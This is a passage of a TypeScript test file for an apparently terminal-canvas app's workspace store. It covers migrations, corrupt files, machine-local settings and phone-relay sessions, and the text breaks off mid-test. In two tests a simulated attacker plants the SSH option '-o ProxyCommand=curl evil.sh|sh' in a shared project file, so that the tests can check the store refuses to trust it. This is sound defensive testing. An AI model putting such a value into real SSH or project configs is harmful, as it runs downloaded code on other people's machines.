import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'
import { promises as fs } from 'fs'
import os from 'os'
import path from 'path'
import { initPlatform, resetPlatformForTests } from './platform'
import { fakePlatform } from './platform-fake'
import { WorkspaceStore } from './workspace-store'
import type { Project, Workspace } from '../shared/types'

let userData: string
let projRoot: string
let fake: ReturnType<typeof fakePlatform>

const project = (over: Partial<Project> = {}): Project => ({
  id: 'p1', name: 'foo', color: '#7aa2f7', viewport: { x: 0, y: 0, zoom: 1 },
  nodes: [{ id: 'term-1', kind: 'terminal', position: { x: 0, y: 0 }, size: { width: 1, height: 1 }, title: 't', color: '#fff', group: null }],
  ...over
})
const ws = (projects: Project[], active = projects[0]?.id ?? ''): Workspace =>
  ({ version: 2, activeProjectId: active, projects })

beforeEach(async () => {
  userData = await fs.mkdtemp(path.join(os.tmpdir(), 'nt-ws-'))
  projRoot = await fs.mkdtemp(path.join(os.tmpdir(), 'nt-proj-'))
  fake = fakePlatform({ userDataDir: userData })
  initPlatform(fake)
})
afterEach(async () => {
  resetPlatformForTests()
  await fs.rm(userData, { recursive: true, force: true })
  await fs.rm(projRoot, { recursive: true, force: true })
})

describe('save → load round trip (v3)', () => {
  it('creates and preserves a machine-local approval id outside the shared project file', async () => {
    const store = new WorkspaceStore()
    const workspace = ws([project({ cwd: projRoot })])

    await store.save(workspace)
    const firstIndex = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
    const approvalId = firstIndex.entries[0].localApprovalId
    expect(approvalId).toMatch(/^[0-9a-f-]{36}$/)

    await store.save(workspace)
    const secondIndex = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
    expect(secondIndex.entries[0].localApprovalId).toBe(approvalId)
    expect(await fs.readFile(path.join(projRoot, '.nodeterm/project.json'), 'utf-8'))
      .not.toContain('localApprovalId')
    await expect(store.githubProject('p1')).resolves.toMatchObject({
      project: { id: 'p1', cwd: projRoot },
      localApprovalId: approvalId
    })
  })

  it('writes <cwd>/.nodeterm/project.json + a v3 index, and loads it back assembled', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ cwd: projRoot }), project({ id: 'p2', name: 'inline' })]))
    const file = JSON.parse(await fs.readFile(path.join(projRoot, '.nodeterm/project.json'), 'utf-8'))
    expect(file).toMatchObject({ version: 1, rev: 1, name: 'foo' })
    expect(file.id).not.toBe('p1') // the file names no project — the index does
    const index = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
    expect(index.version).toBe(3)
    expect(index.entries[0].cwd).toBe(projRoot)
    expect(index.entries[0].project).toBeUndefined()
    const loaded = await new WorkspaceStore().load()
    expect(loaded.version).toBe(2) // in-memory contract stays v2-shaped
    expect(loaded.projects[0]).toMatchObject({ id: 'p1', cwd: projRoot })
    expect(loaded.projects[0].nodes[0].id).toBe('term-1')
    expect(loaded.projects[1]).toMatchObject({ id: 'p2', name: 'inline' })
  })

  // The breadcrumb trail is one person's camera history: it must survive a full app restart on THIS
  // machine (index entry) and never reach the git-shared project file every teammate clones.
  it('keeps a project\'s breadcrumbs machine-local: they survive a fresh store, the shared file never carries them', async () => {
    const breadcrumbs = [
      { nodeId: 'term-1', at: 1_700_000_000_000, note: 'looked at the pty' },
      { nodeId: 'term-2', at: 1_700_000_060_000, note: '' }
    ]
    await new WorkspaceStore().save(ws([project({ cwd: projRoot, breadcrumbs })]))

    const fileRaw = await fs.readFile(path.join(projRoot, '.nodeterm/project.json'), 'utf-8')
    expect(fileRaw).not.toContain('breadcrumbs')
    expect(fileRaw).not.toContain('looked at the pty')
    const index = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
    expect(index.entries[0].breadcrumbs).toEqual(breadcrumbs)

    const loaded = await new WorkspaceStore().load()
    expect(loaded.projects[0].breadcrumbs).toEqual(breadcrumbs)
  })

  it('does not rewrite (or bump rev of) an unchanged project file', async () => {
    const store = new WorkspaceStore()
    const w = ws([project({ cwd: projRoot })])
    await store.save(w)
    const p = path.join(projRoot, '.nodeterm/project.json')
    const first = await fs.readFile(p, 'utf-8')
    await store.save(w)
    expect(await fs.readFile(p, 'utf-8')).toBe(first) // same rev, same bytes
    await store.save(ws([{ ...w.projects[0], name: 'renamed' }]))
    expect(JSON.parse(await fs.readFile(p, 'utf-8'))).toMatchObject({ rev: 2, name: 'renamed' })
  })
})

describe('v2 → v3 migration', () => {
  it('assembles a v2 file on load, then the first save migrates: project files + v3 index + .bak + broadcast', async () => {
    const legacy = ws([project({ cwd: projRoot })])
    await fs.writeFile(path.join(userData, 'workspace.json'), JSON.stringify(legacy))
    const store = new WorkspaceStore()
    const loaded = await store.load()
    expect(loaded.projects[0].id).toBe('p1')
    await store.save(loaded)
    expect(JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8')).version).toBe(3)
    expect(JSON.parse(await fs.readFile(path.join(userData, 'workspace.v2.bak'), 'utf-8')).version).toBe(2)
    expect((await fs.readFile(path.join(projRoot, '.nodeterm/project.json'), 'utf-8'))).toContain('"term-1"')
    expect(fake.sent.some((s) => s.channel === 'workspace:migrated')).toBe(true)
  })

  it('is idempotent: loading + saving v3 again writes no .bak twice and keeps data', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ cwd: projRoot })]))
    await fs.rm(path.join(userData, 'workspace.v2.bak'), { force: true })
    const again = new WorkspaceStore()
    await again.save(await again.load())
    await expect(fs.access(path.join(userData, 'workspace.v2.bak'))).rejects.toThrow()
  })
})

// I1: `ssh.extraArgs` HAS a producer (createSshTerminalNode copies it out of the machine-local SSH
// server store), so every existing ssh-terminal node with a jump host has one in its CURRENT
// project.json while the index has no `localExec` for it. Without a migration the first load after
// the upgrade drops it (the connection breaks), and the next save erases it from disk and
// propagates the deletion to every teammate via `rev`. Silently.
describe('inline (cwd-less) project kanban shape guard', () => {
  const writeInlineIndex = async (kanban: unknown): Promise<void> => {
    await fs.writeFile(
      path.join(userData, 'workspace.json'),
      JSON.stringify({
        version: 3,
        activeProjectId: 'p1',
        entries: [
          {
            id: 'p1',
            name: 'inline',
            color: '#7aa2f7',
            project: {
              id: 'p1', name: 'inline', color: '#7aa2f7', viewport: { x: 0, y: 0, zoom: 1 },
              nodes: [], kanban
            }
          }
        ]
      })
    )
  }

  it('drops a v1-shaped kanban on an inline project (degrades to fresh default, no crash)', async () => {
    await writeInlineIndex({ columns: [], cards: [] })
    const loaded = await new WorkspaceStore().load()
    expect(loaded.projects[0].id).toBe('p1')
    expect('kanban' in loaded.projects[0]).toBe(false)
  })

  it('keeps a well-formed inline kanban verbatim (does not over-strip)', async () => {
    const board = {
      columns: [{ id: 'kcol-a', title: 'To Do', color: '#0a84ff' }],
      assignments: [{ nodeId: 'term-abc', columnId: 'kcol-a' }]
    }
    await writeInlineIndex(board)
    const loaded = await new WorkspaceStore().load()
    expect(loaded.projects[0].kanban).toEqual(board)
  })
})

describe('one-time exec migration (pre-existing project files)', () => {
  /** A v3 index + project file written the way the PRE-fix app wrote them. */
  const writeLegacy = async (extraArgs: string): Promise<void> => {
    await fs.mkdir(path.join(projRoot, '.nodeterm'), { recursive: true })
    await fs.writeFile(
      path.join(projRoot, '.nodeterm/project.json'),
      JSON.stringify({
        version: 1, rev: 3, savedAt: 'then', id: 'p1', name: 'foo', color: '#7aa2f7',
        viewport: { x: 0, y: 0, zoom: 1 },
        nodes: [
          {
            id: 'ssh-1', kind: 'terminal', position: { x: 0, y: 0 },
            size: { width: 1, height: 1 }, title: 't', color: '#fff', group: null,
            ssh: { host: 'h', user: 'u', extraArgs }
          }
        ]
      })
    )
    await fs.writeFile(
      path.join(userData, 'workspace.json'),
      JSON.stringify({
        version: 3, activeProjectId: 'p1',
        entries: [{ id: 'p1', name: 'foo', color: '#7aa2f7', cwd: projRoot }]
      })
    )
  }

  it("hoists the file's exec values into the machine-local index, once, and keeps them working", async () => {
    await writeLegacy('-o ProxyCommand=corp-proxy %h')
    const store = new WorkspaceStore()
    const loaded = await store.load()
    // The jump host still reaches the node — and it is marked as this machine's own, so the exec
    // site (buildSshArgs) honors it.
    expect(loaded.projects[0].nodes[0].ssh?.extraArgs).toBe('-o ProxyCommand=corp-proxy %h')
    expect(loaded.projects[0].nodes[0].ssh?.execTrusted).toBe(true)

    await store.save(loaded)
    const index = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
    expect(index.entries[0].localExec).toEqual({
      'ssh-1': { sshExtraArgs: '-o ProxyCommand=corp-proxy %h' }
    })
    expect(index.entries[0].execMigrated).toBe(true)
    // …and it is gone from the SHARED file (that is the whole point).
    const file = JSON.parse(
      await fs.readFile(path.join(projRoot, '.nodeterm/project.json'), 'utf-8')
    )
    expect(file.nodes[0].ssh.extraArgs).toBeUndefined()
    expect(file.nodes[0].ssh.host).toBe('h')
    // The user is TOLD (one-time note), rather than finding out when something breaks.
    expect(
      fake.sent.some((m) => m.channel === 'workspace:migrated' && m.args[0] === 'exec')
    ).toBe(true)
  })

  it('never hoists twice: a project file changed AFTER the migration cannot re-arm it', async () => {
    await writeLegacy('-A')
    const store = new WorkspaceStore()
    await store.save(await store.load()) // migrates + records execMigrated
    // A teammate (or an attacker with a PR) puts an exec-enabling value back into the shared file.
    const fp = path.join(projRoot, '.nodeterm/project.json')
    const f = JSON.parse(await fs.readFile(fp, 'utf-8'))
    f.nodes[0].ssh.extraArgs = '-o ProxyCommand=curl evil.sh|sh'
    f.rev = 99
    await fs.writeFile(fp, JSON.stringify(f))

    const reloaded = await new WorkspaceStore().load()
    expect(reloaded.projects[0].nodes[0].ssh?.extraArgs).toBe('-A') // OUR value, not the file's
  })

  it('an unreadable ref is not marked migrated — its values are hoisted when it comes back', async () => {
    await writeLegacy('-o ProxyCommand=corp-proxy %h')
    const gone = path.join(projRoot, '.nodeterm/project.json')
    const keep = await fs.readFile(gone, 'utf-8')
    await fs.rm(gone)

    const store = new WorkspaceStore()
    const loaded = await store.load()
    expect(loaded.projects[0].unavailable).toBe(true)
    await store.save(loaded)
    const index = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
    expect(index.entries[0].execMigrated).toBeUndefined() // still owed

    await fs.writeFile(gone, keep) // the disk is back
    const back = await new WorkspaceStore().load()
    expect(back.projects[0].nodes[0].ssh?.extraArgs).toBe('-o ProxyCommand=corp-proxy %h')
  })

  it('within ONE store instance, a deferred ref that comes back migrates exactly once', async () => {
    // The offline→online recovery inside a single, long-lived store: the entry was deferred (its
    // file was gone at first load), so its id sat in execUnmigrated. When the file returns and is
    // read again, that deferral must be cleared — otherwise save() never records execMigrated, the
    // hoist re-runs on every full load, and a project.json swapped in later would be re-hoisted.
    await writeLegacy('-o ProxyCommand=corp-proxy %h')
    const gone = path.join(projRoot, '.nodeterm/project.json')
    const keep = await fs.readFile(gone, 'utf-8')
    await fs.rm(gone)

    const store = new WorkspaceStore()
    const offline = await store.load()
    expect(offline.projects[0].unavailable).toBe(true) // deferred → id in execUnmigrated

    await fs.writeFile(gone, keep) // disk is back
    const online = await store.load() // SAME instance re-reads the now-readable ref
    expect(online.projects[0].nodes[0].ssh?.extraArgs).toBe('-o ProxyCommand=corp-proxy %h')

    await store.save(online)
    const index = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
    expect(index.entries[0].execMigrated).toBe(true) // deferral cleared → migration recorded once
    expect(index.entries[0].localExec).toEqual({
      'ssh-1': { sshExtraArgs: '-o ProxyCommand=corp-proxy %h' }
    })

    // Now the migration is truly done: a hostile value put in the shared file afterward cannot be
    // hoisted as trusted (proves it does NOT keep re-running).
    const f = JSON.parse(await fs.readFile(gone, 'utf-8'))
    f.nodes[0].ssh.extraArgs = '-o ProxyCommand=curl evil.sh|sh'
    f.rev = 99
    await fs.writeFile(gone, JSON.stringify(f))
    const reloaded = await new WorkspaceStore().load()
    expect(reloaded.projects[0].nodes[0].ssh?.extraArgs).toBe('-o ProxyCommand=corp-proxy %h')
  })
})

describe('unavailable & corrupt refs', () => {
  it('marks a ref with a missing folder unavailable (kept, greyed) instead of dropping it', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ cwd: projRoot })]))
    await fs.rm(projRoot, { recursive: true, force: true })
    const loaded = await new WorkspaceStore().load()
    expect(loaded.projects[0]).toMatchObject({ id: 'p1', name: 'foo', unavailable: true, nodes: [] })
  })

  it('sets aside a corrupt project file and marks the project unavailable', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ cwd: projRoot })]))
    const p = path.join(projRoot, '.nodeterm/project.json')
    await fs.writeFile(p, '{ not json')
    const loaded = await new WorkspaceStore().load()
    expect(loaded.projects[0].unavailable).toBe(true)
    const dir = await fs.readdir(path.join(projRoot, '.nodeterm'))
    expect(dir.some((f) => f.startsWith('project.json.corrupt-'))).toBe(true)
  })

  it('sets aside a valid-JSON but wrong-shape project file and marks it unavailable', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ cwd: projRoot })]))
    const p = path.join(projRoot, '.nodeterm/project.json')
    await fs.writeFile(p, '{"version": 99}') // parses, but not a ProjectFileV1
    const loaded = await new WorkspaceStore().load()
    expect(loaded.projects[0].unavailable).toBe(true)
    const dir = await fs.readdir(path.join(projRoot, '.nodeterm'))
    expect(dir.some((f) => f.startsWith('project.json.corrupt-'))).toBe(true)
  })

  it('load({ sideline: false }) marks a corrupt ref unavailable WITHOUT sidelining it', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ cwd: projRoot })]))
    const p = path.join(projRoot, '.nodeterm/project.json')
    await fs.writeFile(p, '{ not json') // e.g. a git-conflict-marked file mid-merge
    const loaded = await new WorkspaceStore().load({ sideline: false })
    expect(loaded.projects[0].unavailable).toBe(true)
    const dir = await fs.readdir(path.join(projRoot, '.nodeterm'))
    expect(dir.some((f) => f.startsWith('project.json.corrupt-'))).toBe(false) // left in place
  })
})

describe('unavailable projects never overwrite real data on save', () => {
  it('save() of an unavailable local project does not touch the project file', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ cwd: projRoot })]))
    const p = path.join(projRoot, '.nodeterm/project.json')
    const original = await fs.readFile(p, 'utf-8')
    // Folder goes missing at load → placeholder with nodes: []
    await fs.rm(projRoot, { recursive: true, force: true })
    const store2 = new WorkspaceStore()
    const loaded = await store2.load()
    expect(loaded.projects[0].unavailable).toBe(true)
    // Disk comes back with the real file (remounted / restored checkout) before the next save
    await fs.mkdir(path.join(projRoot, '.nodeterm'), { recursive: true })
    await fs.writeFile(p, original, 'utf-8')
    await store2.save(loaded)
    expect(await fs.readFile(p, 'utf-8')).toBe(original) // untouched — no nodes:[] overwrite
    const index = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
    expect(index.entries[0].cwd).toBe(projRoot) // entry still refs the cwd
  })

  it('save() of an unavailable ssh project preserves the previous cache verbatim', async () => {
    // Chosen construction: seed a populated ssh cache in the index (so it loads fine), then
    // hand-mark the loaded project unavailable before save — the real data-loss scenario is
    // the placeholder replacing a *good* offline cache.
    const cache = {
      version: 1, rev: 5, savedAt: '2026-01-01T00:00:00.000Z',
      id: 's1', name: 'remote', color: '#7aa2f7', viewport: { x: 0, y: 0, zoom: 1 },
      nodes: [{ id: 'term-1', kind: 'terminal', position: { x: 0, y: 0 }, size: { width: 1, height: 1 }, title: 't', color: '#fff', group: null }]
    }
    const index = {
      version: 3, activeProjectId: 's1',
      entries: [{ id: 's1', name: 'remote', color: '#7aa2f7', ssh: { server: { host: 'h', user: 'u' }, remoteCwd: '~/app' }, cache }]
    }
    await fs.writeFile(path.join(userData, 'workspace.json'), JSON.stringify(index))
    const store = new WorkspaceStore()
    const loaded = await store.load()
    expect(loaded.projects[0].unavailable).toBeFalsy() // cache-backed → loads fine
    // Simulate the ref becoming unavailable in memory (e.g. server unreachable next cycle)
    loaded.projects[0] = { ...loaded.projects[0], unavailable: true, nodes: [] }
    await store.save(loaded)
    const after = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
    expect(after.entries[0].cache).toEqual(cache) // good offline cache survived verbatim
  })

  // The rest of the entry's MACHINE-LOCAL half has the same problem as the cache: a placeholder
  // carries none of it (its viewport is the {0,0,1} of an empty stand-in canvas, its nodes are
  // gone), so an index rewrite while a folder is briefly unmounted would forget where the user was
  // looking, which account this project runs on, and their own custom shell — none of which is
  // recoverable from the project file, because none of it is IN the project file any more.
  it('save() of an unavailable ref keeps the entry\'s camera, account and exec values', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({
      cwd: projRoot,
      viewport: { x: -640, y: 55, zoom: 1.75 },
      defaultAccountId: 'acct-7',
      nodes: [{
        id: 'term-1', kind: 'terminal', position: { x: 0, y: 0 }, size: { width: 1, height: 1 },
        title: 't', color: '#fff', group: null, shell: '/bin/zsh'
      }]
    })]))
    const readEntry = async () =>
      JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8')).entries[0]
    expect(await readEntry()).toMatchObject({
      viewport: { x: -640, y: 55, zoom: 1.75 },
      defaultAccountId: 'acct-7',
      localExec: { 'term-1': { shell: '/bin/zsh' } }
    })

    // The folder goes away: the next load hands the renderer a grey placeholder, and the renderer
    // hands it straight back to save().
    await fs.rm(projRoot, { recursive: true, force: true })
    const store2 = new WorkspaceStore()
    const loaded = await store2.load()
    expect(loaded.projects[0].unavailable).toBe(true)
    expect(loaded.projects[0].viewport).toEqual({ x: 0, y: 0, zoom: 1 }) // the placeholder's
    await store2.save(loaded)

    expect(await readEntry()).toMatchObject({
      viewport: { x: -640, y: 55, zoom: 1.75 },
      defaultAccountId: 'acct-7',
      localExec: { 'term-1': { shell: '/bin/zsh' } }
    })
  })
})

describe('probeFolder', () => {
  it('returns the assembled project when the folder has a project file, else null', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ cwd: projRoot })]))
    const probed = await store.probeFolder(projRoot)
    // A probe ADOPTS a folder, so it mints an id — the file has none to hand out.
    expect(probed).toMatchObject({ name: 'foo', cwd: projRoot })
    expect(probed!.id).not.toBe('p1')
    expect(probed!.nodes.map((n) => n.id)).toEqual(['term-1'])
    expect(await store.probeFolder(path.join(projRoot, 'nope'))).toBeNull()
  })

  it('is read-only: a corrupt file returns null WITHOUT sidelining it (arbitrary-path RPC)', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ cwd: projRoot })]))
    const p = path.join(projRoot, '.nodeterm/project.json')
    await fs.writeFile(p, '{ not json')
    expect(await store.probeFolder(projRoot)).toBeNull()
    expect(await fs.readFile(p, 'utf-8')).toBe('{ not json') // untouched
    const dir = await fs.readdir(path.join(projRoot, '.nodeterm'))
    expect(dir.some((f) => f.startsWith('project.json.corrupt-'))).toBe(false) // no sideline
  })
})

describe('readLocalRefByPath', () => {
  it('maps a watched project.json path back to its project; unknown path → null', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ cwd: projRoot })]))
    const filePath = path.join(projRoot, '.nodeterm/project.json')
    const p = await store.readLocalRefByPath(filePath)
    expect(p).toMatchObject({ id: 'p1', cwd: projRoot })
    expect(await store.readLocalRefByPath(path.join(projRoot, 'nope/project.json'))).toBeNull()
  })

  it('re-arms a global-default answer when a checkout replaces the machine-authored file', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({
      cwd: projRoot,
      agentMessaging: true,
      capabilityAck: { agentMessaging: 'kept' },
      capabilityAckSource: { agentMessaging: 'local-default' }
    })]))
    const filePath = path.join(projRoot, '.nodeterm/project.json')
    const checkedOut = JSON.parse(await fs.readFile(filePath, 'utf-8'))
    checkedOut.name = 'from-checkout'
    checkedOut.rev += 1
    await fs.writeFile(filePath, JSON.stringify(checkedOut))

    const changed = await store.readLocalRefByPath(filePath)
    expect(changed?.agentMessaging).toBe(true)
    expect(changed?.capabilityAck?.agentMessaging).toBeUndefined()
    expect(changed?.capabilityAckSource).toBeUndefined()
    const restarted = await new WorkspaceStore().load()
    expect(restarted.projects[0].capabilityAck?.agentMessaging).toBeUndefined()
    expect(restarted.projects[0].capabilityAckSource).toBeUndefined()
  })

  it('leaves a git-conflict-marked file in place (mid-merge is hand-resolvable, never sidelined)', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ cwd: projRoot })]))
    const filePath = path.join(projRoot, '.nodeterm/project.json')
    const conflicted = '<<<<<<< HEAD\n{"version":1}\n=======\n{"version":1}\n>>>>>>> theirs\n'
    await fs.writeFile(filePath, conflicted)
    expect(await store.readLocalRefByPath(filePath)).toBeNull() // unparsable → no project
    expect(await fs.readFile(filePath, 'utf-8')).toBe(conflicted) // but left in place
    const dir = await fs.readdir(path.join(projRoot, '.nodeterm'))
    expect(dir.some((f) => f.startsWith('project.json.corrupt-'))).toBe(false)
  })
})

describe('same-cwd projects survive a save → load round trip', () => {
  it('two tabs on one folder both come back (first file-backed, second inline)', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ id: 'a', name: 'first', cwd: projRoot }), project({ id: 'b', name: 'second', cwd: projRoot })]))
    // Only one file exists on disk; the second is inline in the index.
    const index = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
    expect(index.entries.filter((e: any) => e.cwd).length).toBe(1)
    expect(index.entries.find((e: any) => e.project)?.project.id).toBe('b')
    const loaded = await new WorkspaceStore().load()
    expect(loaded.projects.map((p) => p.id).sort()).toEqual(['a', 'b'])
    expect(loaded.projects.find((p) => p.id === 'a')).toMatchObject({ name: 'first', cwd: projRoot })
    expect(loaded.projects.find((p) => p.id === 'b')).toMatchObject({ name: 'second' })
  })
})

describe('projects.list relay blob (iOS wire contract)', () => {
  it('the blob JSON.stringify(load()) parses as {version:2, projects:[…]} even when the file is v3', async () => {
    // Seed a real v3 tree on disk (file-backed local ref), as listProjectsOutput sees it.
    await new WorkspaceStore().save(ws([project({ cwd: projRoot })]))
    const onDisk = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
    expect(onDisk.version).toBe(3) // the raw file the OLD blob shipped

    // listProjectsOutput now serves JSON.stringify(await workspaceStore.load()).
    const blob = JSON.stringify(await new WorkspaceStore().load())
    const parsed = JSON.parse(blob)
    expect(parsed.version).toBe(2)
    expect(Array.isArray(parsed.projects)).toBe(true)
    expect(parsed.projects[0]).toMatchObject({ id: 'p1', cwd: projRoot })
    expect(parsed.projects[0].nodes[0].id).toBe('term-1') // node data present (not in the v3 file)
  })
})

describe('localProjectCwds (the phone bridge jail roots)', () => {
  it('lists local ref cwds only — inline and ssh entries carry no host-local root', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([
      project({ cwd: projRoot }),
      project({ id: 'inline1', name: 'inline' }),
      project({ id: 'ssh1', ssh: { server: { host: 'h', user: 'u' } as never, remoteCwd: '~/x' }, cwd: undefined })
    ]))
    expect(store.localProjectCwds()).toEqual([projRoot])
  })

  it('empty before any load/save', () => {
    expect(new WorkspaceStore().localProjectCwds()).toEqual([])
  })
})

// Field bug 2026-08-10: `lastWritten` was populated on the READ paths with a RE-SERIALIZATION of
// the parsed file, not with the bytes actually on disk. Any project.json whose formatting differs
// (a teammate's editor, a git checkout, a trailing newline) therefore never matched isSelfWrite —
// so EVERY fs event on it read as an external change, forever: spurious reloads and conflict bars.
describe('watcher self-write detection compares the RAW file bytes', () => {
  const reformat = async (file: string): Promise<string> => {
    // Semantically identical, different bytes — exactly what another writer leaves behind.
    const raw = (await fs.readFile(file, 'utf-8')) + '\n'
    await fs.writeFile(file, raw)
    return raw
  }

  it('load() records the bytes on disk, not a re-serialization of them', async () => {
    await new WorkspaceStore().save(ws([project({ cwd: projRoot })]))
    const file = path.join(projRoot, '.nodeterm/project.json')
    const raw = await reformat(file)

    const store = new WorkspaceStore()
    await store.load()
    expect(store.isSelfWrite(file, raw)).toBe(true)
    // A genuine outside edit still reads as one.
    expect(store.isSelfWrite(file, raw.replace('"name"', '"nAme"'))).toBe(false)
  })

  it('readLocalRef records the bytes on disk too (the watcher re-read path)', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ cwd: projRoot })]))
    const file = path.join(projRoot, '.nodeterm/project.json')
    const raw = await reformat(file)

    expect(await store.readLocalRefByPath(file)).toMatchObject({ id: 'p1' })
    // Editors and git touch a file several times: the follow-up events for the SAME bytes must
    // not each re-broadcast an "external change".
    expect(store.isSelfWrite(file, raw)).toBe(true)
  })
})

describe('appendRemoteNode (phone-registered sessions over the relay)', () => {
  afterEach(() => {
    vi.restoreAllMocks()
  })

  // The append is a read-modify-write of the very file a save rewrites WHOLE. Off the save chain the
  // two interleave: the phone registers its session, an autosave that read the file first lands last,
  // and the node the phone was just told exists ("true", card on screen) is gone from disk.
  it('is serialized with saves — an in-flight save cannot un-write the appended node', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ cwd: projRoot })]))

    // Stall the next project.json write so the save is still in flight when the append arrives.
    let release!: () => void
    const gate = new Promise<void>((r) => { release = r })
    const realWrite = fs.writeFile.bind(fs)
    let stalled = false
    vi.spyOn(fs, 'writeFile').mockImplementation(async (p, data, enc) => {
      if (!stalled && String(p).includes('project.json')) {
        stalled = true
        await gate
      }
      return realWrite(p as string, data as string, enc as BufferEncoding)
    })

    const saving = store.save(ws([project({ cwd: projRoot, name: 'renamed' })]))
    await new Promise((r) => setTimeout(r, 20)) // the save is parked inside its write
    const appending = store.appendRemoteNode('p1', { id: 'term-zz1-1', title: 'Mobile' })
    await new Promise((r) => setTimeout(r, 20)) // unserialized, the append reads + writes here
    release()
    expect(await appending).toBe(true)
    await saving

    const file = JSON.parse(await fs.readFile(path.join(projRoot, '.nodeterm/project.json'), 'utf-8'))
    expect(file.nodes.map((n: { id: string }) => n.id)).toContain('term-zz1-1') // the phone's session
    expect(file.name).toBe('renamed') // …and the save's own change
  })

  it('appends into a local ref project file and broadcasts the change itself', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ cwd: projRoot })]))
    fake.sent.length = 0
    const ok = await store.appendRemoteNode('p1', { id: 'term-zz1-1', title: 'Mobile' })
    expect(ok).toBe(true)
    const file = path.join(projRoot, '.nodeterm/project.json')
    const raw = await fs.readFile(file, 'utf-8')
    const f = JSON.parse(raw)
    expect(f.rev).toBe(2)
    expect(f.nodes.map((n: { id: string }) => n.id)).toContain('term-zz1-1')
    // This write is OURS. It used to be left out of `lastWritten` on purpose, so the watcher would
    // fire and notify the renderer — a side channel that only worked while the watcher's byte
    // comparison happened to be reliable. The notification is now explicit, so the write is
    // recorded like every other one of ours.
    expect(store.isSelfWrite(file, raw)).toBe(true)
    const broadcast = fake.sent.filter((s) => s.channel === 'workspace:external-change')
    expect(broadcast).toHaveLength(1)
    expect(broadcast[0].args[0]).toMatchObject({ id: 'p1', cwd: projRoot })
    expect(broadcast[0].args[0].nodes.map((n: { id: string }) => n.id)).toContain('term-zz1-1')
  })

  it('refuses unknown / ssh / cwd-less projects and corrupt files (nothing written)', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([
      project({ cwd: projRoot }),
      project({ id: 'ssh1', ssh: { server: { host: 'h', user: 'u' } as never, remoteCwd: '~/x' }, cwd: undefined }),
      project({ id: 'inline1' })
    ]))
    expect(await store.appendRemoteNode('nope', { id: 'term-a1-1' })).toBe(false)
    expect(await store.appendRemoteNode('ssh1', { id: 'term-a1-1' })).toBe(false)
    expect(await store.appendRemoteNode('inline1', { id: 'term-a1-1' })).toBe(false)
    const file = path.join(projRoot, '.nodeterm/project.json')
    await fs.writeFile(file, '{ not json')
    expect(await store.appendRemoteNode('p1', { id: 'term-a1-1' })).toBe(false)
    expect(await fs.readFile(file, 'utf-8')).toBe('{ not json') // untouched
  })
})

describe('removeRemoteNode (the phone\'s "End session" over the relay)', () => {
  it('finds the node by SCAN (no projectId on the wire), removes it and broadcasts the change', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ cwd: projRoot })]))
    fake.sent.length = 0
    expect(await store.removeRemoteNode('term-1')).toBe(true)
    const file = path.join(projRoot, '.nodeterm/project.json')
    const raw = await fs.readFile(file, 'utf-8')
    const f = JSON.parse(raw)
    expect(f.rev).toBe(2)
    expect(f.nodes).toEqual([])
    // Recorded as OUR write + announced explicitly, exactly like appendRemoteNode.
    expect(store.isSelfWrite(file, raw)).toBe(true)
    const broadcast = fake.sent.filter((s) => s.channel === 'workspace:external-change')
    expect(broadcast).toHaveLength(1)
    expect(broadcast[0].args[0]).toMatchObject({ id: 'p1', cwd: projRoot })
    expect(broadcast[0].args[0].nodes).toEqual([])
  })

  it('a node in no local project answers false with nothing written (unregistered phone session)', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ cwd: projRoot })]))
    const file = path.join(projRoot, '.nodeterm/project.json')
    const before = await fs.readFile(file, 'utf-8')
    expect(await store.removeRemoteNode('term-nope-1')).toBe(false)
    expect(await fs.readFile(file, 'utf-8')).toBe(before) // untouched, no rev churn
  })

  it('skips ssh and inline entries — their files are not on this machine / do not exist', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([
      project({ id: 'ssh1', ssh: { server: { host: 'h', user: 'u' } as never, remoteCwd: '~/x' }, cwd: undefined }),
      project({ id: 'inline1' })
    ]))
    expect(await store.removeRemoteNode('term-1')).toBe(false)
  })
})

describe('refreshSshProject', () => {
  const sshConn = { server: { host: 'h', user: 'u' } as any, remoteCwd: '~/app' }
  const remoteFileOf = async (store: WorkspaceStore, p: Project) => {
    // seed: one ssh project saved → cache rev 1
    await store.save(ws([p]))
  }

  it('remote rev > cache rev → adopts remote and reports it', async () => {
    const remote: Record<string, string> = {}
    const io = {
      read: async (id: string) =>
        remote[id] != null ? { status: 'ok' as const, content: remote[id] } : { status: 'absent' as const },
